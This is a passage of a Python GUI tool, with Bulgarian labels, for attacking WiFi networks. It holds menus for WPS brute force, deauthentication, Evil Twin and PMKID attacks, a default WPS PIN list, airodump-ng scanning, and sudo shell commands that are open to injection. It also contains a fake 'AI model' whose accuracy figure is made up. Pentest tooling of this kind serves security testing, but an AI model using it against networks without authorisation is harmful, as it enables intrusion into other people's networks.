#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import subprocess
import pandas as pd
import threading
import os
import time
import re
import json
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import random
import glob
from concurrent.futures import ThreadPoolExecutor
import socket
import fcntl
import struct
from PIL import Image, ImageTk
import shutil
import os
from datetime import datetime
import pexpect
import queue

class WiFiGUIPentestPro(tk.Tk):     
    def __init__(self):
        super().__init__()
        self.title("WiFi Pentest PRO 2025 - BG пентест инструмент")
        self.geometry("1600x1000")
        self.configure(bg="#1E1E1E")
        
        # Икона на приложението
        try:
            self.iconphoto(False, tk.PhotoImage(file='icon.png'))
        except:
            pass

        # Променливи
        self.interface = tk.StringVar(value=self.detect_wifi_interface())
        self.filter_wps = tk.BooleanVar(value=False)
        self.filter_encryption = tk.StringVar(value="Всички")
        self.wpa3_support = tk.BooleanVar(value=False)
        self.concurrent_attacks = tk.IntVar(value=3)
        self.gpu_acceleration = tk.BooleanVar(value=True)
        self.stealth_mode = tk.BooleanVar(value=False)
        self.scan_thread = None
        self.attack_threads = []
        self.output_dir = os.path.join(os.getcwd(), "wifi_gui_pentest_pro")
        os.makedirs(self.output_dir, exist_ok=True)
        self.db_file = "wps_pins.json"
        self.results_file = "scan_history.json"
        self.wordlists_dir = f"{self.output_dir}/wordlists"
        self.cap_files_dir = f"{self.output_dir}/captures"
        self.reports_dir = f"{self.output_dir}/reports"
        self.progress = tk.DoubleVar(value=0)
        self.active_attacks = {}
        self.crack_method = tk.StringVar(value="hashcat")
        self.deauth_packets = tk.IntVar(value=30)
        self.scan_active = False
        self.log_queue = queue.Queue()
        self.handshake_captured = False
        self.pmkid_captured = False
        
        # Инициализиране на конфигурация
        self.config_file = "config.json"
        self.config_data = {}
        self.ai_model = None

        self.check_tools_installation()
        self.load_config()

        # Създаване на директории
        for dir_path in [self.output_dir, self.wordlists_dir, self.cap_files_dir, self.reports_dir]:
            os.makedirs(dir_path, exist_ok=True)
            
        self.init_wps_db()
        self.setup_styles()

        # Основна рамка
        self.main_frame = ttk.Frame(self)
        self.main_frame.pack(padx=10, pady=10, fill="both", expand=True)

        # Лог поле
        self.log_text = tk.Text(
            self.main_frame, height=10, bg="#2D2D2D", fg="white",
            insertbackground="white", wrap="word"
        )
        scrollbar = ttk.Scrollbar(self.main_frame, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        self.log_text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        # Статус текст (добавен за избягване на грешка)
        self.status_text = tk.StringVar(value="Готов")

        # Създаване на компоненти
        self.create_menu()
        self.create_tabs()
        self.create_status_bar()
        self.init_ai_model()
        self.show_warning()

        # Стартираме проверката за съобщения в опашката
        self.after(100, self.process_log_queue)


    def process_log_queue(self):
        """Обработва съобщенията в опашката за логове"""
        try:
            while True:
                message, log_type = self.log_queue.get_nowait()
                self.log_message(message, log_type)
        except queue.Empty:
            pass
        finally:
            self.after(100, self.process_log_queue)

    def setup_styles(self):
        """Конфигурира стилове за тъмен режим."""
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        bg_color = "#1E1E1E"
        fg_color = "#FFFFFF"
        accent_color = "#4CAF50"
        entry_bg = "#2D2D2D"
        button_bg = "#3E3E3E"
        
        self.style.configure(".", background=bg_color, foreground=fg_color)
        self.style.configure("TButton", padding=6, background=button_bg, foreground=fg_color)
        self.style.configure("TLabel", background=bg_color, foreground=fg_color)
        self.style.configure("TEntry", fieldbackground=entry_bg, foreground=fg_color)
        self.style.configure("Treeview", background=entry_bg, foreground=fg_color, fieldbackground=entry_bg)
        self.style.configure("Treeview.Heading", background=accent_color, foreground=fg_color)
        self.style.configure("TCombobox", fieldbackground=entry_bg, foreground=fg_color)
        self.style.configure("TProgressbar", troughcolor=entry_bg, background=accent_color)
        self.style.configure("TNotebook", background=bg_color)
        self.style.configure("TNotebook.Tab", background=button_bg, foreground=fg_color)
        self.style.map("TNotebook.Tab", background=[("selected", accent_color)])

    def detect_wifi_interface(self):
        """Автоматично открива WiFi интерфейс."""
        try:
            result = subprocess.check_output(["iwconfig"], text=True)
            interfaces = [line.split()[0] for line in result.splitlines() if "IEEE" in line]
            
            # Проверяваме за интерфейси в мониторен режим
            monitor_ifaces = [iface for iface in interfaces if self.is_monitor_mode(iface)]
            if monitor_ifaces:
                return monitor_ifaces[0]
                
            return interfaces[0] if interfaces else "wlan0"
        except:
            return "wlan0"

    def init_wps_db(self):
        """Инициализира база данни с WPS PIN-ове."""
        if not os.path.exists(self.db_file):
            default_pins = {
                "default": ["12345670", "00000000", "11111111", "12345678"],
                "D-Link": ["28436123", "22972307"],
                "TP-Link": ["56789012", "87654321"],
                "Asus": ["56789012", "12345670"],
                "Huawei": ["01234567", "76543210"]
            }
            with open(self.db_file, "w") as f:
                json.dump(default_pins, f, indent=4)

    def init_ai_model(self):
        """Инициализира AI модела (placeholder)"""
        self.ai_model = {
            "version": "1.0",
            "trained_on": "2025-01-01",
            "accuracy": 0.85
        }
        self.log_message("AI моделът е зареден", "success")

    def check_tools_installation(self):
        """Проверява дали всички необходими инструменти са инсталирани"""
        required_tools = {
            "hcxdumptool": "apt install hcxtools",
            "bully": "apt install bully",
            "hashcat": "apt install hashcat",
            "mdk4": "apt install mdk4",
            "aircrack-ng": "apt install aircrack-ng",
            "reaver": "apt install reaver",
            "macchanger": "apt install macchanger",
            "hostapd": "apt install hostapd",
            "wireshark": "apt install wireshark"
        }
        
        missing = []
        for tool, install_cmd in required_tools.items():
            try:
                subprocess.run(["which", tool], check=True, 
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                missing.append((tool, install_cmd))
        
        if missing:
            msg = "Липсващи инструменти:\n"
            for tool, cmd in missing:
                msg += f"- {tool} (инсталирайте с: {cmd})\n"
            messagebox.showwarning("Липсващи инструменти", msg)

    def load_config(self):
        """Зарежда конфигурация от файл"""
        default_config = {
            "wordlists_dir": "/usr/share/wordlists",
            "max_threads": 3,
            "default_interface": "wlan0"
        }
        
        try:
            with open(self.config_file) as f:
                self.config_data = json.load(f)
            # Прилагаме настройките
            self.wordlists_dir = self.config_data.get("wordlists_dir", self.wordlists_dir)
            self.concurrent_attacks.set(self.config_data.get("max_threads", 3))
        except:
            self.config = default_config
            with open(self.config_file, "w") as f:
                json.dump(default_config, f)

    def create_menu(self):
        """Създава меню лента."""
        menubar = tk.Menu(self, bg="#1E1E1E", fg="white")
        self.config(menu=menubar)

        # Меню за WiFi
        wifi_menu = tk.Menu(menubar, tearoff=0, bg="#2E2E2E", fg="white")
        menubar.add_cascade(label="Wi-Fi", menu=wifi_menu)
        wifi_menu.add_command(label="Избери интерфейс", command=self.select_interface)
        wifi_menu.add_command(label="Мониторен режим", command=self.enable_monitor_mode)
        wifi_menu.add_command(label="Случаен MAC адрес", command=self.randomize_mac)
        wifi_menu.add_separator()
        wifi_menu.add_command(label="Информация за интерфейса", command=self.show_interface_info)

        # Меню за атаки
        attack_menu = tk.Menu(menubar, tearoff=0, bg="#2E2E2E", fg="white")
        menubar.add_cascade(label="Атаки", menu=attack_menu)
        
        # Класически атаки
        classic_menu = tk.Menu(attack_menu, tearoff=0, bg="#2E2E2E", fg="white")
        attack_menu.add_cascade(label="Класически", menu=classic_menu)
        classic_menu.add_command(label="WEP атака", command=self.wep_attack)
        classic_menu.add_command(label="WPS атака", command=self.wps_attack)
        classic_menu.add_command(label="WPA/WPA2 атака", command=self.wpa_attack)
        
        # Разширени атаки
        advanced_menu = tk.Menu(attack_menu, tearoff=0, bg="#2E2E2E", fg="white")
        attack_menu.add_cascade(label="Разширени", menu=advanced_menu)
        advanced_menu.add_command(label="WPA3 Dragonblood", command=self.wpa3_attack)
        advanced_menu.add_command(label="PMKID атака", command=self.pmkid_attack)
        advanced_menu.add_command(label="Pixie Dust атака", command=self.pixie_dust_attack)
        advanced_menu.add_command(label="Evil Twin", command=self.evil_twin_attack)
        advanced_menu.add_command(label="Деавторизация", command=self.deauth_attack)
        
        # Интелигентни атаки
        attack_menu.add_command(label="Автоматичен одит", command=self.auto_audit)
        attack_menu.add_command(label="Интелигентна атака", command=self.ai_attack)
        attack_menu.add_command(label="Активни атаки", command=self.show_active_attacks)

        # Меню за файлове
        files_menu = tk.Menu(menubar, tearoff=0, bg="#2E2E2E", fg="white")
        menubar.add_cascade(label="Файлове", menu=files_menu)
        files_menu.add_command(label="Добави речник", command=self.add_wordlist)
        files_menu.add_command(label="Добави .cap файл", command=self.add_cap_file)
        files_menu.add_command(label="Добави правила за Hashcat", command=self.add_hashcat_rules)
        files_menu.add_separator()
        files_menu.add_command(label="Експорт в PDF", command=self.export_pdf)
        files_menu.add_command(label="Експорт в HTML", command=self.export_html)

        # Меню за информация
        info_menu = tk.Menu(menubar, tearoff=0, bg="#2E2E2E", fg="white")
        menubar.add_cascade(label="Информация", menu=info_menu)
        info_menu.add_command(label="За авторите", command=self.show_authors)
        info_menu.add_command(label="Проверка за актуализации", command=self.check_updates)
        info_menu.add_command(label="Документация", command=self.show_docs)

        # Меню за настройки
        settings_menu = tk.Menu(menubar, tearoff=0, bg="#2E2E2E", fg="white")
        menubar.add_cascade(label="Настройки", menu=settings_menu)
        settings_menu.add_command(label="Тема", command=self.toggle_theme)
        settings_menu.add_checkbutton(label="GPU ускорение", variable=self.gpu_acceleration)
        settings_menu.add_checkbutton(label="Стелт режим", variable=self.stealth_mode)
        settings_menu.add_separator()
        settings_menu.add_command(label="Конфигурация", command=self.show_settings)

    def create_tabs(self):
        """Създава раздели за различните функционалности."""
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill="both", expand=True)

        # Раздел за сканиране
        self.scan_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.scan_tab, text="Сканиране")
        self.create_scan_panel()

        # Раздел за атаки
        self.attack_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.attack_tab, text="Атаки")
        self.create_attack_panel()

        # Раздел за кракване
        self.crack_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.crack_tab, text="кракване")
        self.create_crack_panel()

        # Раздел за анализ
        self.analyze_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.analyze_tab, text="Анализ")
        self.create_analyze_panel()

        # Раздел за доклади
        self.report_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.report_tab, text="Доклади")
        self.create_report_panel()

    def create_scan_panel(self):
        """Създава панел за сканиране на мрежи."""
        control_frame = ttk.Frame(self.scan_tab)
        control_frame.pack(fill="x", pady=5)
        
        ttk.Label(control_frame, text="Wi-Fi интерфейс:").pack(side="left", padx=5)
        ttk.Entry(control_frame, textvariable=self.interface, width=15).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Обнови", command=self.refresh_interfaces).pack(side="left", padx=5)
        
        ttk.Checkbutton(control_frame, text="Само WPS", variable=self.filter_wps).pack(side="left", padx=10)
        ttk.Checkbutton(control_frame, text="WPA3", variable=self.wpa3_support).pack(side="left", padx=10)
        
        ttk.Label(control_frame, text="Филтър:").pack(side="left", padx=5)
        ttk.Combobox(control_frame, textvariable=self.filter_encryption, 
                    values=["Всички", "WEP", "WPA", "WPA2", "WPA3", "Без"], width=8).pack(side="left", padx=5)
        
        self.scan_button = ttk.Button(control_frame, text="Сканирай", command=self.scan_networks)
        self.scan_button.pack(side="left", padx=10)

        ttk.Button(control_frame, text="Авто одит", command=self.auto_audit).pack(side="left", padx=5)

        self.stop_button = ttk.Button(control_frame, text="Спри", command=self.stop_scan)
        self.stop_button.pack(side="left", padx=5)
        self.stop_button.config(state="disabled")

        # Таблица с мрежи
        table_frame = ttk.Frame(self.scan_tab)
        table_frame.pack(fill="both", expand=True, pady=5)
        
        columns = ("BSSID", "ESSID", "Канал", "Сигнал", "WPS", "Заключен", "Версия", "Криптиране", "Клиенти", "Производител")
        self.network_table = ttk.Treeview(table_frame, columns=columns, show="headings", height=20)
        
        for col in columns:
            self.network_table.heading(col, text=col)
            self.network_table.column(col, width=120, minwidth=80, anchor="center")
        
        self.network_table.column("ESSID", width=180)
        self.network_table.column("BSSID", width=150)
        self.network_table.column("Производител", width=120)

        
        scrollbar = ttk.Scrollbar(table_frame, orient="vertical", command=self.network_table.yview)
        self.network_table.configure(yscrollcommand=scrollbar.set)
        
        self.network_table.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        self.network_table.bind("<Double-1>", self.on_network_select)

        self.network_table.bind("<Button-3>", self.show_context_menu)

        # Създаване на контекстно меню
        self.context_menu = tk.Menu(self, tearoff=0)
        self.context_menu.add_command(label="WPS детайли", command=self.show_wps_details)
        self.context_menu.add_command(label="Pixie Dust тест", command=self.pixie_dust_test)
        self.context_menu.add_command(label="WPS brute force", command=self.wps_brute_force)

        # Графика за сигнал
        self.fig, self.ax = plt.subplots(figsize=(8, 4), dpi=100)
        self.fig.set_facecolor("#1E1E1E")
        self.ax.set_facecolor("#2D2D2D")
        self.canvas = FigureCanvasTkAgg(self.fig, master=self.scan_tab)
        self.canvas.get_tk_widget().pack(fill="x", pady=5)
        
        # Прогрес бар
        self.scan_progress = ttk.Progressbar(self.scan_tab, variable=self.progress, maximum=100)
        self.scan_progress.pack(fill="x", pady=5)
        
        # Лог
        self.log_text = tk.Text(self.scan_tab, height=8, bg="#2D2D2D", fg="white", 
                              insertbackground="white", wrap="word")
        scrollbar_log = ttk.Scrollbar(self.scan_tab, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar_log.set)
        
        self.log_text.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar_log.pack(side="right", fill="y")
        self.log_text.config(state="disabled")

    def create_attack_panel(self):
        """Създава панел за атаки."""
        attack_notebook = ttk.Notebook(self.attack_tab)
        attack_notebook.pack(fill="both", expand=True)
        
        # WPS атаки
        wps_frame = ttk.Frame(attack_notebook)
        attack_notebook.add(wps_frame, text="WPS")
        
        ttk.Label(wps_frame, text="WPS атаки срещу избрана мрежа").pack(anchor="w", pady=5)
        
        btn_frame = ttk.Frame(wps_frame)
        btn_frame.pack(fill="x", pady=5)
        
        ttk.Button(btn_frame, text="Класическа WPS атака", command=self.wps_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Pixie Dust атака", command=self.pixie_dust_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Offline PIN атака", command=self.offline_pin_attack).pack(side="left", padx=5)
        
        # WPA/WPA2 атаки
        wpa_frame = ttk.Frame(attack_notebook)
        attack_notebook.add(wpa_frame, text="WPA/WPA2")
        
        ttk.Label(wpa_frame, text="WPA/WPA2 атаки").pack(anchor="w", pady=5)
        
        btn_frame = ttk.Frame(wpa_frame)
        btn_frame.pack(fill="x", pady=5)
        
        ttk.Button(btn_frame, text="Захвани хендшейк", command=self.capture_handshake).pack(side="left", padx=5)
        
        # Добавяме контроли за deauth атака
        deauth_frame = ttk.Frame(wpa_frame)
        deauth_frame.pack(fill="x", pady=5)
        ttk.Label(deauth_frame, text="Deauth пакети:").pack(side="left")
        ttk.Entry(deauth_frame, textvariable=self.deauth_packets, width=5).pack(side="left", padx=5)
        ttk.Button(deauth_frame, text="Деавторизация", command=self.deauth_attack).pack(side="left", padx=5)
        
        ttk.Button(btn_frame, text="PMKID атака", command=self.pmkid_attack).pack(side="left", padx=5)
        
        # WPA3 атаки
        wpa3_frame = ttk.Frame(attack_notebook)
        attack_notebook.add(wpa3_frame, text="WPA3")
        
        ttk.Label(wpa3_frame, text="WPA3 Dragonblood атаки").pack(anchor="w", pady=5)
        
        btn_frame = ttk.Frame(wpa3_frame)
        btn_frame.pack(fill="x", pady=5)
        
        ttk.Button(btn_frame, text="SAE Downgrade", command=self.sae_downgrade_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Side-Channel атака", command=self.side_channel_attack).pack(side="left", padx=5)
        
        # Други атаки
        other_frame = ttk.Frame(attack_notebook)
        attack_notebook.add(other_frame, text="Други")
        
        ttk.Label(other_frame, text="Различни атаки").pack(anchor="w", pady=5)
        
        btn_frame = ttk.Frame(other_frame)
        btn_frame.pack(fill="x", pady=5)
        
        ttk.Button(btn_frame, text="Evil Twin", command=self.evil_twin_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Beacon Flood", command=self.beacon_flood_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Karma атака", command=self.karma_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Rogue AP", command=self.rogue_ap_attack).pack(side="left", padx=5)
        
        # Лог за атаки
        self.attack_log = tk.Text(self.attack_tab, height=10, bg="#2D2D2D", fg="white", 
                                insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(self.attack_tab, command=self.attack_log.yview)
        self.attack_log.configure(yscrollcommand=scrollbar.set)
        
        self.attack_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        self.attack_log.config(state="disabled")

    def create_crack_panel(self):
        """Създава панел за кракване на пароли."""
        main_frame = ttk.Frame(self.crack_tab)
        main_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Избор на файл за кракване
        file_frame = ttk.Frame(main_frame)
        file_frame.pack(fill="x", pady=5)
        
        ttk.Label(file_frame, text="Файл за кракване:").pack(side="left")
        self.crack_file = ttk.Entry(file_frame, width=40)
        self.crack_file.pack(side="left", padx=5)
        ttk.Button(file_frame, text="Избери", command=self.select_crack_file).pack(side="left")
        
        # Избор на речник
        wordlist_frame = ttk.Frame(main_frame)
        wordlist_frame.pack(fill="x", pady=5)
        
        ttk.Label(wordlist_frame, text="Речник:").pack(side="left")
        self.wordlist_combo = ttk.Combobox(wordlist_frame, width=37)
        self.wordlist_combo.pack(side="left", padx=5)
        ttk.Button(wordlist_frame, text="Обнови", command=self.update_wordlists).pack(side="left")
        
        # Настройки за кракване
        options_frame = ttk.Frame(main_frame)
        options_frame.pack(fill="x", pady=5)

        
        ttk.Label(options_frame, text="Тип хеш:").pack(side="left")
        self.hash_type = ttk.Combobox(options_frame, values=[
            "WPA-PMKID-PBKDF2", "WPA-PMK-PBKDF2", "WPA-PMKID-PMK", "WEP"
        ], width=20)
        self.hash_type.pack(side="left", padx=5)
        self.hash_type.current(0)
        
        ttk.Checkbutton(options_frame, text="GPU ускорение", variable=self.gpu_acceleration).pack(side="left", padx=10)

        # Добавяме радиобутони за избор на метод за кракване
        ttk.Label(options_frame, text="Метод:").pack(side="left")
        ttk.Radiobutton(options_frame, text="Hashcat", variable=self.crack_method, 
                       value="hashcat").pack(side="left", padx=5)
        ttk.Radiobutton(options_frame, text="Aircrack", variable=self.crack_method, 
                       value="aircrack").pack(side="left", padx=5)
        
        # Добавяме бутон за конвертиране
        ttk.Button(options_frame, text="Конвертирай CAP", 
                  command=self.convert_selected_cap).pack(side="left", padx=10)

        # Бутони за кракване
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill="x", pady=10)
        
        ttk.Button(btn_frame, text="Стартирай кракване", command=self.start_cracking).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Спри", command=self.stop_cracking).pack(side="left", padx=5)
        
        # Лог за кракване
        self.crack_log = tk.Text(main_frame, height=15, bg="#2D2D2D", fg="white", 
                               insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(main_frame, command=self.crack_log.yview)
        self.crack_log.configure(yscrollcommand=scrollbar.set)
        
        self.crack_log.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        self.crack_log.config(state="disabled")
        
        # Зареждане на речници при стартиране
        self.update_wordlists()

    def create_analyze_panel(self):
        """Създава панел за анализ на мрежи."""
        main_frame = ttk.Frame(self.analyze_tab)
        main_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Информация за мрежа
        info_frame = ttk.LabelFrame(main_frame, text="Информация за мрежа")
        info_frame.pack(fill="x", pady=5)
        
        self.network_info = tk.Text(info_frame, height=10, bg="#2D2D2D", fg="white", 
                                  insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(info_frame, command=self.network_info.yview)
        self.network_info.configure(yscrollcommand=scrollbar.set)
        
        self.network_info.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        self.network_info.config(state="disabled")
        
        # Клиенти в мрежата
        client_frame = ttk.LabelFrame(main_frame, text="Клиенти")
        client_frame.pack(fill="both", expand=True, pady=5)
        
        columns = ("MAC", "IP", "Производител", "Пакети", "Сигнал")
        self.client_table = ttk.Treeview(client_frame, columns=columns, show="headings", height=10)
        
        for col in columns:
            self.client_table.heading(col, text=col)
            self.client_table.column(col, width=120, anchor="center")
        
        scrollbar = ttk.Scrollbar(client_frame, orient="vertical", command=self.client_table.yview)
        self.client_table.configure(yscrollcommand=scrollbar.set)
        
        self.client_table.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Бутони за анализ
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill="x", pady=5)
        
        ttk.Button(btn_frame, text="Анализирай мрежа", command=self.analyze_network).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Пакетен анализ", command=self.packet_analysis).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="AI анализ", command=self.ai_analysis).pack(side="left", padx=5)

    def create_report_panel(self):
        """Създава панел за генериране на доклади."""
        main_frame = ttk.Frame(self.report_tab)
        main_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Настройки за доклад
        settings_frame = ttk.LabelFrame(main_frame, text="Настройки за доклад")
        settings_frame.pack(fill="x", pady=5)
        
        ttk.Label(settings_frame, text="Заглавие:").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.report_title = ttk.Entry(settings_frame, width=40)
        self.report_title.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        self.report_title.insert(0, "WiFi Security Audit Report")
        
        ttk.Label(settings_frame, text="Формат:").grid(row=1, column=0, padx=5, pady=5, sticky="e")
        self.report_format = ttk.Combobox(settings_frame, values=["PDF", "HTML", "CSV", "TXT"], width=10)
        self.report_format.grid(row=1, column=1, padx=5, pady=5, sticky="w")
        self.report_format.current(0)
        
        # Съдържание на доклада
        content_frame = ttk.LabelFrame(main_frame, text="Съдържание")
        content_frame.pack(fill="both", expand=True, pady=5)
        
        self.report_content = tk.Text(content_frame, height=15, bg="#2D2D2D", fg="white", 
                                    insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(content_frame, command=self.report_content.yview)
        self.report_content.configure(yscrollcommand=scrollbar.set)
        
        self.report_content.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Бутони за доклад
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill="x", pady=5)
        
        ttk.Button(btn_frame, text="Генерирай доклад", command=self.generate_report).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Преглед", command=self.preview_report).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Запази", command=self.save_report).pack(side="left", padx=5)

    def create_status_bar(self):
        """Създава статус бар."""
        self.status_bar = ttk.Frame(self, height=25)
        self.status_bar.pack(fill="x", side="bottom")
        
        self.status_text = tk.StringVar(value="Готов")
        ttk.Label(self.status_bar, textvariable=self.status_text).pack(side="left", padx=5)
        
        ttk.Label(self.status_bar, text="Интерфейс:").pack(side="left", padx=5)
        ttk.Label(self.status_bar, textvariable=self.interface).pack(side="left", padx=5)
        
        self.status_mode = tk.StringVar(value="Нормален")
        ttk.Label(self.status_bar, text="Режим:").pack(side="left", padx=5)
        ttk.Label(self.status_bar, textvariable=self.status_mode).pack(side="left", padx=5)

    def show_warning(self):
        """Показва предупреждение за законна употреба."""
        messagebox.showwarning("Внимание",
            "Това приложение е предназначено само за законни тестове на сигурността и етично хакерство.\n"
            "Използването му без изрично разрешение е незаконно!\n\n"
            "Използвайте отговорно и в съответствие с местните закони и регулации.")

    def log_message(self, message, log_type="info"):
        """Добавя съобщение в лога."""
        target = self.log_text
        target.config(state="normal")
        
        # Цветове според типа на съобщението
        if log_type == "error":
            target.tag_config("error", foreground="#FF5555")
            target.insert(tk.END, f"[!] {message}\n", "error")
        elif log_type == "success":
            target.tag_config("success", foreground="#55FF55")
            target.insert(tk.END, f"[+] {message}\n", "success")
        elif log_type == "warning":
            target.tag_config("warning", foreground="#FFFF55")
            target.insert(tk.END, f"[*] {message}\n", "warning")
        else:
            target.insert(tk.END, f"[i] {message}\n")
            
        target.see(tk.END)
        target.config(state="disabled")
        self.status_text.set(message[:50] + "..." if len(message) > 50 else message)

    def log_attack(self, attack_name, message, log_type="info"):
        """Специален логер за атаки с повече детайли"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        target = self.attack_log
        
        target.config(state="normal")
        target.insert(tk.END, f"[{timestamp}] {attack_name}: ", "bold")
        
        if log_type == "error":
            target.tag_config("error", foreground="#FF5555")
            target.insert(tk.END, f"{message}\n", "error")
        elif log_type == "success":
            target.tag_config("success", foreground="#55FF50")
            target.insert(tk.END, f"{message}\n", "success")
        elif log_type == "warning":
            target.tag_config("warning", foreground="#FFFF55")
            target.insert(tk.END, f"{message}\n", "warning")
        else:
            target.insert(tk.END, f"{message}\n")
            
        target.see(tk.END)
        target.config(state="disabled")
        self.status_text.set(f"{attack_name}: {message[:50]}...")

    def convert_cap_to_hccapx(self, cap_file):
        """Конвертира .cap файл към .hccapx формат за hashcat"""
        if not cap_file.endswith('.cap'):
            self.log_message("Файлът трябва да бъде .cap формат", "error")
            return None
            
        output_file = cap_file.replace('.cap', '.hccapx')
        command = f"cap2hccapx {cap_file} {output_file}"
        
        self.log_message(f"Конвертиране на {cap_file} към HCCAPX...")
        if self.run_command(command, "Конвертирането успешно", "Грешка при конвертиране"):
            return output_file
        return None

    def run_command(self, command, success_msg="Командата завърши успешно.", 
                   error_msg="Грешка при изпълнение на командата.", log_output=True, timeout=60):
        """Изпълнява системна команда и логва резултата."""
        if not command.startswith("sudo "):
            command = "sudo " + command
        self.log_message(f"Изпълнява: {command}")
        self.progress.set(0)
        
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            start_time = time.time()
            while process.poll() is None:
                if time.time() - start_time > timeout:
                    process.terminate()
                    self.log_message(f"Командата беше прекратена след {timeout} секунди", "warning")
                    return False
                self.progress.set((self.progress.get() + 5) % 100)
                self.update()
                time.sleep(0.5)
                
            output, error = process.communicate()
            
            if log_output:
                for line in output.splitlines():
                    self.log_message(line)
                for line in error.splitlines():
                    self.log_message(line, "error")
            
            if process.returncode == 0:
                self.log_message(success_msg, "success")
                self.progress.set(100)
                return True
            else:
                self.log_message(f"{error_msg} Код: {process.returncode}", "error")
                return False
                
        except Exception as e:
            self.log_message(f"Грешка: {str(e)}", "error")
            return False

    def scan_networks(self):
        """Сканира WiFi мрежи и показва резултатите"""
        if not self.is_monitor_mode(self.interface.get()):
            self.log_message("Интерфейсът не е в мониторен режим", "warning")
            if not messagebox.askyesno("Предупреждение", 
                                    "Искате ли да активирате мониторен режим?"):
                return
            self.enable_monitor_mode()
            
        if self.scan_thread and self.scan_thread.is_alive():
            self.log_message("Сканирането вече е в ход", "warning")
            return
        
        self.network_table.delete(*self.network_table.get_children())
        self.log_message("Започва сканиране на WiFi мрежи...")
        self.scan_active = True
        self.scan_button.config(state="disabled")
        self.stop_button.config(state="normal")
        
        # Изчистване на стари файлове
        for f in glob.glob(f"{self.output_dir}/scan*"):
            os.remove(f)
        
        command = (
            f"sudo airodump-ng {self.interface.get()} "
            f"-w {self.output_dir}/scan --output-format csv --write-interval 1 "
            f"--band abg --ignore-negative-one"
        )

        self.scan_thread = threading.Thread(target=self.process_scan, args=(command,))
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def stop_scan(self):
        """Спира активното сканиране"""
        self.scan_active = False
        self.stop_button.config(state="disabled")
        self.scan_button.config(state="normal")
        self.run_command("sudo pkill airodump-ng", "Сканирането е спряно", "Грешка при спиране на сканирането")

    def process_scan(self, command):
        """Обработва резултатите от сканирането"""
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, text=True)
            
            while self.scan_active:
                time.sleep(5)  # Проверяваме на всеки 5 секунди
                self.update_scan_results()
                
            process.terminate()
            time.sleep(1)  # Даваме време на процеса да се затвори
            
        except Exception as e:
            self.log_queue.put((f"Грешка при сканиране: {str(e)}", "error"))
        finally:
            self.scan_thread = None
            self.scan_button.config(state="normal")
            self.stop_button.config(state="disabled")

    def update_scan_results(self):
        """Обновява резултатите от сканирането в реално време"""
        try:
            csv_files = glob.glob(f"{self.output_dir}/scan*.csv")
            if not csv_files:
                return
                
            latest_csv = max(csv_files, key=os.path.getctime)
            if os.path.getsize(latest_csv) < 100:
                return
                
            with open(latest_csv, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            networks = []
            current_bssids = set()
            
            # Запазваме текущите избрани редове
            selected_items = self.network_table.selection()
            selected_bssids = [self.network_table.item(item)["values"][0] for item in selected_items]
            
            self.network_table.delete(*self.network_table.get_children())
            
            lines = content.splitlines()
            for line in lines[2:]:
                if not line.strip() or line.startswith('Station'):
                    break
                    
                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 14:
                    continue
                    
                bssid = parts[0]
                essid = parts[13] if len(parts) > 13 else "Скрита мрежа"
                channel = parts[3] if parts[3] else "?"
                power = parts[8] if parts[8] else "-100"
                encryption = parts[5] if parts[5] else "?"
                
                # Проверка за WPS с wash
                wps_info = self.scan_wps_info(bssid, channel)
                wps_status = "Да" if wps_info and wps_info['Locked'] == 'Не' else "Не"
                vendor = self.get_vendor(bssid)
                
